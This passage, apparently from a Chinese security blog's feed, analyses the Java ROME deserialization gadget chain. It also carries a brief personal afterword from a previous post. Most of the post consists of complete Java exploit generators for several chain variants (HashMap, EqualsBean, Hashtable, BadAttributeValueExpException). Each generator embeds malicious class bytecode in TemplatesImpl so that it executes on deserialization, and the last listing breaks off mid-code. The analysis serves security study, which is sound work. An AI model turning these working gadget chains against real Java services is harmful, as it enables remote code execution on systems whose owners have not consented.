src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828115219-umqswte.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828115326-24nss9w.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828115353-hkhhc53.png" alt="image">​</p><p>‍</p><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>最近摆烂了，感觉很多时候技术并不是特别重要的东西，还是我的好大哥说的好，技术变现真不如关系关系变现，CTF固然是很好的，但慢慢的从早期的套娃到现如今的大家一起做，虽然在去年我也是PY小子，如今也是尝试了一把一个Java题做一天的感觉，做出来的感觉确实不错，但也是得经历过才能理解吧，为了比赛而比赛我认为还是得摇人，但为了技术来看务必要静下心来慢慢的去研究一个题目，虽然自己有时候还是把握不住想要去找人讨论的欲望，但还是得尽力克制，也是快秋招了，秋招已经被pass好多了，原本要活的心态也寄掉了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - ROME链</title>
    <link href="/post/java-security-rome-chain-1ojxop.html"/>
    <url>/post/java-security-rome-chain-1ojxop.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><p>‍</p><h1 id="ROME链"><a href="#ROME链" class="headerlink" title="ROME链"></a>ROME链</h1><p>‍</p><p>emm说实话这个ROME链其实可以理解为fastjson的触发 就是调用任意的getter方法，那么fastjson的打法基本上可以直接抄过来了</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p>‍</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">HashMap#readObject</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">ObjectBean#hashCode()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">ToStringBean#toString(String)</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">TemplatesImpl.getOutputProperties()</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p>​<code>com.sun.syndication.feed.impl.ObjectBean</code>​ 是 Rome 提供的一个封装类，初始化时提供了一个 Class 类型和一个 Object 对象实例进行封装</p><p>ObjectBean 有三个成员变量，分别是 EqualsBean&#x2F;ToStringBean&#x2F;CloneableBean 类，这三个类为 ObjectBean 提供了 <code>equals</code>​、<code>toString</code>​、<code>clone</code>​ 以及 <code>hashCode</code>​ 方法。</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622876.png" alt="image">​</p><p>‍</p><p>来看一下 ObjectBean 的 <code>hashCode</code>​ 方法，会调用 EqualsBean 的 <code>beanHashCode</code>​ 方法</p><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622377.png" alt="image">​</p><p>‍</p><p>调用 EqualsBean 中保存的 <code>_obj</code>​ 的 <code>toString()</code>​ 方法</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622601.png" alt="image">​</p><p>‍</p><p>而这个 <code>toString()</code>​ 方法也就是触发利用链的地方，继 BadAttributeValueExpException 之后的另一个使用 <code>toString()</code>​ 方法触发利用的链。</p><p>‍</p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p>​<code>com.sun.syndication.feed.impl.ToStringBean</code>​ 类从名字可以看出，这个类给对象提供 toString 方法，类中有两个 toString 方法，第一个是无参的方法。获取调用链中上一个类或 <code>_obj</code>​ 属性中保存对象的类名，并调用第二个 toString 方法。</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622789.png" alt="image">​</p><p>‍</p><p>然后这个有参方法会调用 <code>BeanIntrospector.getPropertyDescriptors()</code>​ 来获取 <code>_beanClass</code>​ 的全部 getter&#x2F;setter 方法，然后判断参数长度为 0 的方法使用 <code>_obj</code>​ 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622104.png" alt="image">​</p><p>由此可见，ToStringBean 的 <code>toString()</code>​ 方法可以触发其中 <code>_obj</code>​ 实例的全部 getter 方法，可以用来触发 TemplatesImpl 的利用链。</p><p>‍</p><p>‍</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;zjacky&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">// 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-comment">// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString</span><br>        <span class="hljs-comment">// 先封装一个无害的类</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;zjacky&quot;</span>));<br><br>        <span class="hljs-comment">// 放入 Map 中</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;zjacky&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-comment">// put 到 map 之后再反射写进去，避免触发漏洞</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br><span class="hljs-comment">//        serialize(map);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622455.png" alt="image">​</p><h2 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h2><p>这个链子其实非常简单，所以会有很多排列组合，只需要反序列化入口能够出发hashcode()方法或者最终触发到ToStringBean方法的tostring就行</p><p>‍</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#ReadObject() -&gt; EqualsBean#hashCode() -&gt; ToStringBean#toString(String) -&gt; TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="​EqualsBean-class-hashcode​​"><a href="#​EqualsBean-class-hashcode​​" class="headerlink" title="​EqualsBean.class#hashcode​​"></a>​<code>EqualsBean.class#hashcode</code>​​</h3><p>相当于跳过了一步吧，感觉没啥用只能说是一种变形</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME_ObjectBean_hashCode</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templatesimpl);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean);<br><br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(objectBean, <span class="hljs-string">&quot;123&quot;</span>);<br><br><span class="hljs-comment">//        serialize(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="​HashTable-readobject-​​"><a href="#​HashTable-readobject-​​" class="headerlink" title="​HashTable#readobject()​​"></a>​<code>HashTable#readobject()</code>​​</h3><p>HashTable利用链其实并不是针对ROME的利用链。其作用是能够类似hashmap一样调用任意类的hashcode方法</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashTable#ReadObject() -&gt; ObjectBean#hashCode() -&gt; ToStringBean#toString(String) -&gt; TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><h4 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h4><p>先断到<code>HashTable#reconstitutionPut()</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622007.png" alt="image">​</p><p>可以发现也是直接调用<code>key</code>​的<code>hashcode</code>​方法</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622461.png" alt="image">​</p><p>​​</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br> <br><span class="hljs-keyword">import</span> Serial.Serial;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br> <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME_HashTable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br> <br>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));<br> <br>        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);<br>        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br> <br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templatesimpl);<br> <br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean);<br> <br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(objectBean,<span class="hljs-string">&quot;123&quot;</span>);<br> <br>        Serial.Serialize(hashtable);<br>        Serial.DeSerialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h3><p>‍</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException#readObject() -&gt; ToStringBean.toString(String) -&gt; TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME_BadAttributeValueExpException</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templatesimpl);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">123</span>);<br><br>        setValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,toStringBean);<br><br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    